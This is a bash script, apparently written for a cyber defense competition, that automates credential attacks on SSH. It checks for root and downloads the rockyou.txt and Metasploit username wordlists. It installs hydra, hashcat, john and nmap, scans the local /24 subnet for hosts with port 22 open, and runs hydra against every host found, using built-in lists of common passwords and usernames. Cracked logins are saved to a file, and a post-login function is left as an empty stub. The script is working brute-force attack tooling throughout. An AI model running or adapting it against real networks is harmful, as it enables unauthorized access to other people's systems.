#!/bin/bash
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## gathers passwords
	## cleans up output file
	## logs into ssh session and does it's business
########################################################################################
########################################################################################
	#
	#*************** NEED TO DO/ADD ***********************
	# check and create all dir/files
	# check/install/configure needed apps
	# include a ccdc generated username list
	# don't assume /24 CIDR, and find the right one
	# check multiple interfaces and multiple IP ranges
	# change IP if getting blocked ( but only try a few times, and test for connectivity to avoid infinite loop)
	# clean it up
	# stop using tmp files
	# add testing for files and what not to get rid of error spam
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#### RUN function #####
#######################
function main(){	###
	neo				###
	meat			###
	bones			###
	brute			###
	assassin		###
}					###
#######################
#------ error handling ----------
### If error, give up			#
set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
# (works in functions)			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
#### Variables ####
pwListFull="/usr/share/wordlists/rockyou.txt"
userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
listsDir="/usr/share/wordlists"
###########################################################################################
#are you root? no? well, try again
###########################################################################################
function neo(){
	if [[ $EUID -ne 0  ]]; then
		printf "\nyou forgot to run as root again... "
		printf "\nCurrent dir is "$(pwd)"\n\n"
		exit 1
	fi
	}
###########################################################################################
# checking for files and dirs
###########################################################################################
function bones(){
###################################################
### checking for 'official' lists #################
	#checking for wordlist dir
	if [[ ! -d $listsDir ]]; then
		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
		command mkdir -p "$listsDir"/metasploit
	fi

	#checking for 'rockyou.txt' password list
	if [[ ! -f "$pwListFull" ]]; then
		printf "\n"
		#checking for the .gz
		if [[ -f "$pwListFull".gz ]]; then
			printf "\nExtracting rockyou.txt\n"
			command tar -xf "$pwListFull".gz -C "$listsDir"
		else
			#downloading rockyou.txt
			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
		fi
	fi

	#checking for 'unix_users.txt'
	if [[ ! -f "$userListUnix" ]]; then
		#downloading unix_users list
		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
		printf "\n\n\n"
	fi

##################################################
### checking for/creating custom lists ###########

	#file locations
		hydraOutput="/tmp/hydraOutput"
		crackedLogins="logins"
		listLiveHosts="listTargets"
		listPwsBasic="listPwsBasic"
		listUsersBasic="listUsersBasic"

	### gathering live HOSTS
	#gathering local network ID
		netID="$(route -n | tail -n +3 | cut -d" " -f1 | grep -P "[^^0\.].+\.0")"
	#if 'targets' file doesn't exist, then make it
		if [[ ! -f "$listLiveHosts" ]]; then
			printf "\nGenerating list of pingable hosts on the network, might take short while (~2 min)\n\n------\n\n"
			printf "$(nmap -p 22 $netID/24 -oG - | awk '/22\/open/{print $2}')\n" > "$listLiveHosts"
			command sed -i "/$(hostname -I | tr -d " ")/d" "$listLiveHosts"
		fi
		printf "\tTargets List:\n$(cat $listLiveHosts)\n"
	### basic list of PASSWORDS
	#if 'listPwsBasic' doesnt' exist, then make it
		if [[ ! -f "$listPwsBasic" ]]; then
			printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\n" > $listPwsBasic
			#printf "P@ssw0rd\npassword\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nCCDC\nccdc\n" > $listPwsBasic
			#pwListFull		#defined elsewhere
		fi
	### basic list of USERNAMES
	#if 'listUsersBasic' doesn't exist, then make it
		if [[ ! -f "$listUsersBasic" ]]; then
			printf "student\nccdc\nuser\nghost\ncartman\nstan\nkyle\nkenny\npcprincipal\nreality\njack\nkate\nrenko\nclay\nturner\nkylie\nbecca\njo\nallie\nsarah\nsaryn\nrhino\nnidus\nlazors\n" > $listUsersBasic
			#printf "student\nccdc\nuser\n" > $listUsersBasic
			#userListUnix	#defined elsewhere
		fi
}
###########################################################################################
# check/install/configure apps
###########################################################################################
function meat(){
##################################################
### checking for/installing tools ################
	command="hydra hashcat john nmap curl net-tools"
	installing=""
	updated=1
	scriptPath="$(pwd)/$(basename $0)"

	### updating repo list, if it hasn't already been updated recently
		if [[ $updated == 0 ]]; then
			command apt update
		# updates the script so it knows it doesn't need to check again
			sed -i 's/updated=0/updated=1/' $scriptPath
		fi
	# checking if apps are installed
		for word in $command; do
			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
				installing="${installing} "$word""
			fi
		done
	# installing missing apps
		if [ ! -z "$installing" ]; then
			command yes | apt install $installing
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------\n"
		fi

	# where important lists are stored
		#printf "\n\tUsername List:\n"
		#printf "\n\t\t["$userListUnix"]\n\n"
		#printf "\n\tPassword List:\n"
		#printf "\n\t\t["$pwListFull"]\n\n"

}
###########################################################################################
# banging down the door
###########################################################################################
function brute(){
	# tmp files
		#********add remove all tmp files at the end **************************************************
		#make sure these are all tmp files
		tmpFiles=""$hydraOutput" "$crackedLogins" "$listLiveHosts" "$listPwsBasic" "$listUsersBasic""

	### testing all login info for all IPs
		#**** if hydra.restore ask if skip ****************************************************
		#also ask if want ot restore
		if [ -f hydra.restore ]; then
:
		fi
		#***** if not success with basic, then do full ****************************************
		command hydra -o "$hydraOutput" -L "$listUsersBasic" -P "$listPwsBasic" -M "$listLiveHosts" ssh
		command sed -i '/^#/d' "$hydraOutput"
		if [ -s $hydraOutput ]; then
			printf "\nCleaning up output\n"
			command awk '/^\[/{print $3" "$5" "$7}' "$hydraOutput" > "$crackedLogins"
			command rm "$hydraOutput"
		else
			printf "\n\n----No passwords found----\n\n"
			command rm "$hydraOutput"
		fi


}
###########################################################################################
# ssh's in and does it's business
###########################################################################################
function assassin(){
	#
	:
	}
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main
